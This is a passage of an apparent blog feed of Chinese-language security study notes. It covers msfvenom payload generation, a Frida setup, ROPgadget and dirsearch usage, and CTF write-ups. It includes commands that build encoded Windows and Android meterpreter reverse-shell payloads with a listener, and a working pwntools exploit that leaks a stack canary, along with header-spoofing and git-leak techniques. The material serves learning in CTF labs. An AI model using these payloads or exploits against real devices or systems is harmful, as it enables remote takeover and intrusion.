id="2-用到msfvenom命令"><a href="#2-用到msfvenom命令" class="headerlink" title="2.用到msfvenom命令"></a>2.用到msfvenom命令</h2><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>-p</td><td>指定需要使用的payload</td></tr><tr><td>-l</td><td>列出指定模块的所有可用资源</td></tr><tr><td>-n</td><td>为payload预先指定一个NOP滑动长度，用于防止程序崩溃。</td></tr><tr><td>-f</td><td>指定输出格式，例如exe、elf、php、js等。</td></tr><tr><td>-e</td><td>指定需要使用的encoder编码器，以隐藏恶意代码。</td></tr><tr><td>-a</td><td>指定payload的目标架构，例如x86、x64等。</td></tr><tr><td>–platform</td><td>指定payload的目标平台，例如Windows、Linux等。</td></tr><tr><td>-s</td><td>设定有效攻击荷载的最大长度。</td></tr><tr><td>-b</td><td>设定规避字符集，以防止生成的payload中包含不可用字符。</td></tr><tr><td>-i</td><td>指定payload的编码次数。</td></tr><tr><td>–shellest</td><td>最小化生成payload。</td></tr></tbody></table><p>例子:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp ... #這是指定android的</span><br></pre></td></tr></table></figure><p>-e 编码器 :</p><table><thead><tr><th>Encoder</th><th>描述</th></tr></thead><tbody><tr><td>alphanum</td><td>使用字母数字字符对代码进行编码。</td></tr><tr><td>alpha_upper</td><td>使用大写字母字符对代码进行编码。</td></tr><tr><td>fnstenv_mov</td><td>使用FPU指令对代码进行编码。</td></tr><tr><td>jmp_call_additive</td><td>使用跳转指令和调用指令对代码进行编码。</td></tr><tr><td>nonalpha</td><td>使用非字母字符对代码进行编码。</td></tr><tr><td>nonupper</td><td>使用非大写字母字符对代码进行编码。</td></tr><tr><td>unicode_upper</td><td>使用Unicode字符对代码进行编码。</td></tr></tbody></table><br/><p>原整例子:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp \</span><br><span class="line">lhost=127.0.0.1 lport=9999 -e x86/shikata_ga_nai -i 3 -b &#x27;\x00\x0a\xff&#x27; -f exe -o payload.exe</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -b&#x27;\x0\x0b&#x27; \</span><br><span class="line">lhost=127.0.0.1 lport=9999 -f dll &gt; payload.dll</span><br><span class="line"></span><br><span class="line">msfvenom -p android/meterpreter/reverse_tcp \</span><br><span class="line">lhost=127.0.0.1 lport=9999 R&gt; /home/kali/payload.apk</span><br></pre></td></tr></table></figure><img src="bfd5d40ce1dd2d43839f515453278d34.png" alt="bfd5d40ce1dd2d43839f515453278d34.png" /><br/><h1 id="Android-舊版"><a href="#Android-舊版" class="headerlink" title="Android(舊版)"></a>Android(舊版)</h1><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp \</span><br><span class="line">lhost=127.0.0.1 lport=9999 R&gt; /home/kali/payload.apk</span><br></pre></td></tr></table></figure><p>生成後發去android機上, 小弟經費有限，只能用模擬器了（哭），下學期再買安卓</p><img src="760a1a839fb9e2900d4432e2e5ca3567.png" alt="760a1a839fb9e2900d4432e2e5ca3567.png" /><p>在kali下打開監聽程序:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure><p>設置payload:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload android/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p>設置IP和PORT:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set lhost 127.0.0.1 </span><br><span class="line">set lport 9999</span><br></pre></td></tr></table></figure><img src="7eb4d3cd6755f16979b18344330280f9.png" alt="7eb4d3cd6755f16979b18344330280f9.png" /><p>啟動:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><img src="248fd01720495a2c02eff0136b06c7f7.png" alt="248fd01720495a2c02eff0136b06c7f7.png" /><img src="191e22ecdb18f6a6524a329b7cde4045.png" alt="191e22ecdb18f6a6524a329b7cde4045.png" /><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app_list #查看app</span><br></pre></td></tr></table></figure><img src="2d92f2b5a0c7e03d30f646a2c5c9ec83.png" alt="2d92f2b5a0c7e03d30f646a2c5c9ec83.png" /><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app_run [package] #自己喜歡開什麼就開什麼</span><br></pre></td></tr></table></figure><img src="7ad85d147861dd3d99eef0f1d8fe540f.png" alt="7ad85d147861dd3d99eef0f1d8fe540f.png" />]]></content>
      
      
      <categories>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenSSH的使用(Windows)</title>
      <link href="/ghsc_ovo_0721/OpenSSH%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/ghsc_ovo_0721/OpenSSH%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="OpenSSH的使用-Windows"><a href="#OpenSSH的使用-Windows" class="headerlink" title="OpenSSH的使用(Windows)"></a>OpenSSH的使用(Windows)</h1><p>vscode 是最好的IDE!!!</p><p>以下是用vscode 的remote ssh 和windows 功能 OpenSSH 來實現遠程控制 </p><p>這是一個for windows10的使用的SSH筆記:</p><h2 id="下載vscode"><a href="#下載vscode" class="headerlink" title="下載vscode"></a>下載vscode</h2><p><a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p><h2 id="下載remote-ssh"><a href="#下載remote-ssh" class="headerlink" title="下載remote ssh"></a>下載remote ssh</h2><p>在vscode 搜尋remote ssh 下載 :</p><img src="95d949cb995b83b10d44c4e0f41288e9.png" alt="95d949cb995b83b10d44c4e0f41288e9.png" /><p>用法很簡單:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh [username]@[localhost]</span><br></pre></td></tr></table></figure><p>可以在想要遠程的本機搜尋(windows):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">ipconfig</span><br></pre></td></tr></table></figure><p>ipconfig選WIFI的地址</p><h2 id="開啟OpenSSH"><a href="#開啟OpenSSH" class="headerlink" title="開啟OpenSSH"></a>開啟OpenSSH</h2><p>開啟OpenSSH的功能,有一些windows有內建功能的,可以參考這一篇博客:<br><a href="https://blog.csdn.net/nl9788/article/details/131653284">https://blog.csdn.net/nl9788/article/details/131653284</a></p><p> , 如果沒有的話跟著以下步驟:</p><p>在Github下載OpenSSH:</p><p><a href="https://github.com/PowerShell/Win32-OpenSSH/releases/tag/10.0.0.0p2-Preview">https://github.com/PowerShell/Win32-OpenSSH/releases/tag/10.0.0.0p2-Preview</a></p><img src="730119a2fe8c3e11eb34774422de1402.png" alt="730119a2fe8c3e11eb34774422de1402.png" /><p>找到合適的版本 , 新建一個文件夾在<code>&quot;C:\Program Files\OpenSSH&quot;</code> , copy在這文件夾上</p><p>解壓, 用管理員模式開啟powershell , <code>cd &quot;C:\Program Files\OpenSSH&quot;</code> </p><img src="1e1498579227228e18604757f6b919b7.png" alt="1e1498579227228e18604757f6b919b7.png" /><p>用<code>.\install-sshd.ps1</code>安裝 </p><p>安裝完成後，配置防火墙：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-NetFirewallRule -Name sshd -DisplayName &#x27;OpenSSH Server (sshd)&#x27; -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22</span><br></pre></td></tr></table></figure><p>設定自動啟用 OpenSSH:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-Service sshd | Set-Service -StartupType Automatic -PassThru</span><br><span class="line">Start-Service sshd</span><br></pre></td></tr></table></figure><p>驗證 OpenSSH 是否正在執行:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get-service sshd</span><br></pre></td></tr></table></figure><img src="607be35ba7f14a88fa23a5789d32ba64.png" alt="607be35ba7f14a88fa23a5789d32ba64.png" /><p>然後就可以用vscode來ssh連接。</p>]]></content>
      
      
      <categories>
          
          <category> other </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStar2023_Canary</title>
      <link href="/ghsc_ovo_0721/NewStar2023-Canary/"/>
      <url>/ghsc_ovo_0721/NewStar2023-Canary/</url>
      
        <content type="html"><![CDATA[<h2 id="1-Canary-是什麼？"><a href="#1-Canary-是什麼？" class="headerlink" title="1. Canary 是什麼？"></a>1. Canary 是什麼？</h2><p>Canary (金絲雀) 是一種用來防止緩衝區溢位攻擊的保護機制。程式會在函式開始時在堆疊上放置一個隨機的值 (Canary)，並在函式返回前檢查這個值是否被改變。如果被改變，表示發生了緩衝區溢位，程式會立即終止。</p><p>在 32 位元程式中，Canary 通常是一個 4 位元組的值，並且以 <code>\x00</code> 結尾。它被放在 saved EBP (舊的 EBP) 和區域變數之間。</p><h2 id="2-看看程式的資訊"><a href="#2-看看程式的資訊" class="headerlink" title="2.看看程式的資訊"></a>2.看看程式的資訊</h2><img src="925cf0f80b5f3bad48b8b9ca73cf5957.png" alt="925cf0f80b5f3bad48b8b9ca73cf5957.png" /><p>是一個64位的ELF , 開了NX 和CANARY 和 RELERO</p><p>今次我們要學習如何用pwndbg來找出canary</p><p>先看看IDA的偽代碼:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[40]; // [rsp+0h] [rbp-30h] BYREF</span><br><span class="line">  unsigned __int64 v5; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  puts(&quot;Welcome to NewStar CTF!!&quot;);</span><br><span class="line">  puts(&quot;Give me some gift?&quot;);</span><br><span class="line">  read(0, buf, 0x20u);</span><br><span class="line">  puts(&quot;Oh thanks,There is my gift:&quot;);</span><br><span class="line">  printf(buf);</span><br><span class="line">  puts(&quot;Show me your magic&quot;);</span><br><span class="line">  read(0, buf, 0x100u);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看見有兩個read函數 和一個printf函數 ,  read(0, buf, 0x20u); 第一個的read讀取20個字節(u) , 第二個100字節(u) , 由於開了NX 不能用shellcode , 要用後門函數或ROP鏈 , </p><p>在IDA發現了backdoor函數:</p><img src="375c9a3e1f280ef206960f1bfaa90216.png" alt="375c9a3e1f280ef206960f1bfaa90216.png" /><img src="91ac1c6d344675c4fdab435647931ac9.png" alt="91ac1c6d344675c4fdab435647931ac9.png" /><p>backdoor : 0x401262 </p><p>我們要在print找到canary 再用recvuntil()截取地址 , 最後在payload 中加入canary</p><p>首先叫出偉大的gdb大人 , 下一個斷點在read 函數那:</p><img src="1543c2757effce1d49829104a1a8b3f0.png" alt="1543c2757effce1d49829104a1a8b3f0.png" /><ol><li>b* main </li><li>b *0x401310</li><li>b *0x401335</li><li>b *0x40135A</li><li>cyclic 20 生成一個20字節的字符串 , 看看cyclic </li><li>stack 30</li></ol><img src="5ff12d98052698996f80eff1c506df62.png" alt="5ff12d98052698996f80eff1c506df62.png" /><p>0x00 是 canary 小金絲鳥是00 , 不難看 在 rbp-0x8那有一個00 地址是: 0x7fffffffd598</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">05:0028│-008     0x7fffffffd598 ◂— 0x2ae9f13115290200</span><br></pre></td></tr></table></figure><p>在gdb canary一下沒出來 :<br><img src="07b6e380a5d375a6276f404ec46e2f42.png" alt="07b6e380a5d375a6276f404ec46e2f42.png" /></p><p>–all 一下 : 出來捏</p><img src="078ebb6ca03cf8249cb81d4562e25bef.png" alt="078ebb6ca03cf8249cb81d4562e25bef.png" /><p>在-008那 , 那麼算一算偏移量:  5 </p><img src="67d1a20f339b7c34c181e34ab985583b.png" alt="67d1a20f339b7c34c181e34ab985583b.png" /><img src="8d0f4205b9f19924d5d45ed3846f9121.png" alt="8d0f4205b9f19924d5d45ed3846f9121.png" /><p>16*6 是canary , &#x2F;16 &#x3D; 6 </p><p>不難看出字符串偏移量為6 , 6+5 &#x3D; %11$p</p><p>現在寫一寫payload思路 :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">b&#x27;aaaaaa %11$p&#x27;</span>)</span><br></pre></td></tr></table></figure><img src="ffa12e0ad0da22c35e68de34f82120e3.png" alt="ffa12e0ad0da22c35e68de34f82120e3.png" /><p>成功打印出來了 , </p><img src="55b2f70596f9090b7b0ab3303559a784.png" alt="55b2f70596f9090b7b0ab3303559a784.png" /><p>那我可以寫一下payload 了 , 垃圾數據+canary+rbp(0x8)+返回地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x98</span>-<span class="number">0x70</span>)+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(shell_addr)</span><br></pre></td></tr></table></figure><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;node5.anna.nssctf.cn&#x27;, 22047)</span></span><br><span class="line">p = process(<span class="string">&quot;./canary&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./canary&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x401262</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Give me some gift?&#x27;</span>,<span class="string">b&#x27;aaaaa%11$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaa&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;00&#x27;</span>).decode(),<span class="number">16</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x98</span>-<span class="number">0x70</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(shell_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Show me your magic&#x27;</span> , payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="f71571a040bd1bfb5e48831796692882.png" alt="f71571a040bd1bfb5e48831796692882.png" /><img src="9e6b1f0ce6cc87c18d40d490fbac1cde.png" alt="9e6b1f0ce6cc87c18d40d490fbac1cde.png" />]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Frida使用</title>
      <link href="/ghsc_ovo_0721/Frida%E4%BD%BF%E7%94%A8/"/>
      <url>/ghsc_ovo_0721/Frida%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>frida 是一款基于 python+javascript 的 hook 框架，可运行在 android、ios、linux、win等各个平台，主要使用的动态二进制插桩技术。</p><p>我安裝在win conda frida_env 那</p><p><a href="https://">https://mumu.163.com/help/20220721/35047_730476.html</a></p><img src="87116c7103ef679365debd9886ff7240.png" alt="87116c7103ef679365debd9886ff7240.png" /><p>E:\mumu\MuMuPlayer\nx_device\12.0\shell</p><p>adb connect 127.0.0.1:5555</p><p>E:\mumu\MuMuPlayer\nx_device\12.0\shell&gt;adb devices<br>List of devices attached<br>127.0.0.1:5555  device<br>emulator-5554   device</p><p>E:\mumu\MuMuPlayer\nx_device\12.0\shell&gt;adb -s 127.0.0.1:5555 shell getprop ro.product.cpu.abi<br>x86_64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb -s 127.0.0.1:5555 push 本地文件 /sdcard/</span><br><span class="line">adb -s 127.0.0.1:5555 pull /sdcard/文件 本地路径</span><br><span class="line">E:/BaiduNetdiskDownload/frida-server64/frida-server64 /sdcard/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">adb -s 127.0.0.1:5555 shell</span><br><span class="line">#1. 进入ADB Shell</span><br><span class="line">su</span><br><span class="line">mv /sdcard/frida-server64 /data/local/tmp/</span><br><span class="line">chmod 755 /data/local/tmp/frida-server64</span><br><span class="line">ls -la /data/local/tmp/frida-server64</span><br><span class="line">cd /data/local/tmp</span><br><span class="line">./frida-server64 &amp;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">每次重启模拟器后需要重新运行 ./frida-server64 &amp;</span><br></pre></td></tr></table></figure><br/><h2 id="我的啟動"><a href="#我的啟動" class="headerlink" title="我的啟動"></a>我的啟動</h2><h3 id="📋-前置準備"><a href="#📋-前置準備" class="headerlink" title="📋 前置準備"></a>📋 前置準備</h3><ol><li>確保MuMu模擬器已開啟</li><li>確認ADB工具可用</li></ol><h3 id="🔄-連接步驟"><a href="#🔄-連接步驟" class="headerlink" title="🔄 連接步驟"></a>🔄 連接步驟</h3><p>步驟1：連接MuMu模擬器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd E:\mumu\MuMuPlayer\nx_device\12.0\shell</span><br><span class="line">adb connect 127.0.0.1:5555</span><br></pre></td></tr></table></figure><p>步驟2：進入ADB Shell並啟動frida-server</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb -s 127.0.0.1:5555 shell</span><br><span class="line">su</span><br><span class="line">cd /data/local/tmp</span><br><span class="line">./frida-server64 &amp;</span><br></pre></td></tr></table></figure><p>步驟3：驗證frida-server運行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps | grep frida</span><br></pre></td></tr></table></figure><p>步驟4：在新CMD窗口測試Frida</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda activate frida_env</span><br><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure><p>如果版本不匹配：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install frida==16.7.10</span><br><span class="line">pip install frida-tools==16.7.10</span><br></pre></td></tr></table></figure><h3 id="🎯-常用Frida命令"><a href="#🎯-常用Frida命令" class="headerlink" title="🎯 常用Frida命令"></a>🎯 常用Frida命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -U                    # 列出進程</span><br><span class="line">frida-ps -Uai                  # 列出已安裝應用</span><br><span class="line">frida -U -f com.example.app    # 啟動並附加應用</span><br><span class="line">frida-ls-devices               # 列出設備</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ROPgadget 使用</title>
      <link href="/ghsc_ovo_0721/ROPgadget%20%E4%BD%BF%E7%94%A8/"/>
      <url>/ghsc_ovo_0721/ROPgadget%20%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>安裝:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-capstone</span><br><span class="line"> </span><br><span class="line">git clone https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line"> </span><br><span class="line">cd ROPgadget</span><br><span class="line"> </span><br><span class="line">sudo python3 setup.py install</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class="line">查找可存储寄存器的代码</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --string &quot;/bin/sh&quot;</span><br><span class="line">查找字符串</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only &#x27;int&#x27;</span><br><span class="line">查找有int 0x80的地址</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dirsearch使用</title>
      <link href="/ghsc_ovo_0721/dirsearch%E4%BD%BF%E7%94%A8/"/>
      <url>/ghsc_ovo_0721/dirsearch%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target     //简单的查看网址目录和文件</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt        //使用文件拓展名为php,txt,zip的字典扫描目标url</span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --recursive -R 2</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --recursive -R 4 --scan-subdirs=/,/wp-content/,/wp-admin/</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --exclude-texts=This,AndThat</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt -H &quot;User-Agent: IE&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://xxxx        //日常使用</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r        //递归扫描，不过容易被检测</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r -t 30        //线程控制请求速率</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r -t 30 --proxy 127.0.0.1:8080        //使用代理</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>(WEB)2025 SWPU-NSSCTF 秋季招新入门训练赛 ak</title>
      <link href="/ghsc_ovo_0721/WEB-2025-SWPU-NSSCTF-%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/"/>
      <url>/ghsc_ovo_0721/WEB-2025-SWPU-NSSCTF-%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="2025-SWPU-NSSCTF-秋季招新入门训练赛"><a href="#2025-SWPU-NSSCTF-秋季招新入门训练赛" class="headerlink" title="2025 SWPU-NSSCTF 秋季招新入门训练赛"></a><strong>2025 SWPU-NSSCTF 秋季招新入门训练赛</strong></h1><p>作者：ghsc</p><h2 id="1-gift-F12"><a href="#1-gift-F12" class="headerlink" title="1.gift_F12"></a>1.gift_F12</h2><p>簽到題!!!! 按F12</p><img src="ea1d840fdce1643f0679f8441d42a454.png" alt="ea1d840fdce1643f0679f8441d42a454.png" /><p>把WLLMCTF換成NSSCTF提交 </p><h2 id="2-Do-you-know-http"><a href="#2-Do-you-know-http" class="headerlink" title="2.Do_you_know_http"></a>2.Do_you_know_http</h2><img src="15a6aa5a5d627d7c6c6af2cbf3a3580c.png" alt="15a6aa5a5d627d7c6c6af2cbf3a3580c.png" /><p>要用bp抓包 , 可以看到出現了 Please use ‘WLLM’ browser! 在bp上開啟Repeater , 然後把包中的Uesr-Agent 方式改成WLLM</p><img src="a087106c7ae1afb280efa8de4e9bda56.png" alt="a087106c7ae1afb280efa8de4e9bda56.png" /><p>Send後服務器返回了.&#x2F;a.php , 可以把&#x2F;hello.php 改成a.php 再Send </p><img src="8ada2a790db134c7885a3af35606f208.png" alt="8ada2a790db134c7885a3af35606f208.png" /><p>要在本地才可以read  , 所以在包中加入 X-Forwarded-For:127.0.0.1</p><img src="93bfd15a54a6d67530a5982cd73dc321.png" alt="93bfd15a54a6d67530a5982cd73dc321.png" /><p>返回了一個&#x2F;secretttt.php , 再來把a.php 改成 secretttt.php ,得出flag </p><img src="1c642baa4c8ccf941b8062e36b97b514.png" alt="1c642baa4c8ccf941b8062e36b97b514.png" /><h2 id="3-WebFTP"><a href="#3-WebFTP" class="headerlink" title="3.WebFTP"></a>3.WebFTP</h2><img src="311fa37e164eb8b923532fe5b20faca2.png" alt="311fa37e164eb8b923532fe5b20faca2.png" /><p>使用kali 中的dirsearch 扫描 , 在kali 中打入 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch python.py -u http://node7.anna.nssctf.cn:29562/?m=login&amp;a=in</span><br></pre></td></tr></table></figure><img src="9a10db4e14ad10f73bf3f6772c0f6ef6.png" alt="9a10db4e14ad10f73bf3f6772c0f6ef6.png" /><p>存在git泄露 , 使用GitHack 下載克隆目录</p><img src="01adb43f1c64d8cfb3d9d1ba1fe3d795.png" alt="01adb43f1c64d8cfb3d9d1ba1fe3d795.png" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 GitHack.py http://node7.anna.nssctf.cn:29562/?m=login&amp;a=in/.git</span><br></pre></td></tr></table></figure><img src="05b1101fe54144c815914cdf75f0c960.png" alt="05b1101fe54144c815914cdf75f0c960.png" /><p>空仓库。。。。。。。。。。</p><img src="84fe613a7014ffd37f31a06bb249307f.png" alt="84fe613a7014ffd37f31a06bb249307f.png" /><p>最後在phpinfo.php中找到了flag 。。</p><img src="a1d0e26387232549f1c999611ef7a649.png" alt="a1d0e26387232549f1c999611ef7a649.png" /><h2 id="4-jicao"><a href="#4-jicao" class="headerlink" title="4.jicao"></a>4.jicao</h2><p>这道题是一个php代码审计题目</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title 